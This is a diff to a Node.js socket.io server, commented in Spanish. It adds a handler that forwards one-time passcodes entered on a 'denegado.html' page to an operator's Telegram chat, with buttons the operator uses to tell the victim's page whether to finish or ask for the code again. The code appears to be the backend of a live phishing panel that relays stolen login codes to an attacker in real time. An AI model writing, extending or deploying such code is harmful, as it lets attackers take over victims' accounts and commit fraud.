@@ -69,6 +69,25 @@ io.on('connection', (socket) => {
 
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
+
+  // Cuando se envía OTP desde denegado.html
+  socket.on('otpIngresado', ({ codigo, sessionId }) => {
+    activeSockets.set(sessionId, socket);
+
+    const mensaje = `📨 El usuario volvió a ingresar un OTP:\n\n🧾 Código: ${codigo}`;
+    const botones = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` },
+            { text: '❌ Error de OTP', callback_data: `otpError_${sessionId}` }
+          ]
+        ]
+      }
+    };
+
+    bot.sendMessage(telegramChatId, mensaje, botones);
+  });
 });
 
 // Cuando se presiona un botón en Telegram
@@ -104,6 +123,22 @@ bot.on('callback_query', (query) => {
       const decision = data.startsWith('error_') ? 'error' : 'pedir_usuario';
       socket.emit('respuestaCodigo', decision);
       bot.sendMessage(chatId, decision === 'error' ? '⚠️ Código incorrecto.' : '🔁 Ingrese nuevamente su usuario.');
+    } else {
+      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
+    }
+
+    activeSockets.delete(sessionId);
+  }
+
+  // Manejo de botones tras el reintento OTP en denegado.html
+  else if (data.startsWith('finalizar_') || data.startsWith('otpError_')) {
+    const sessionId = data.split('_')[1];
+    const socket = activeSockets.get(sessionId);
+
+    if (socket) {
+      const decision = data.startsWith('finalizar_') ? 'finalizar' : 'otp_error';
+      socket.emit('respuestaOtp', decision);
+      bot.sendMessage(chatId, decision === 'finalizar' ? '✅ Proceso finalizado.' : '❌ Código OTP inválido nuevamente.');
     } else {
       bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
     }
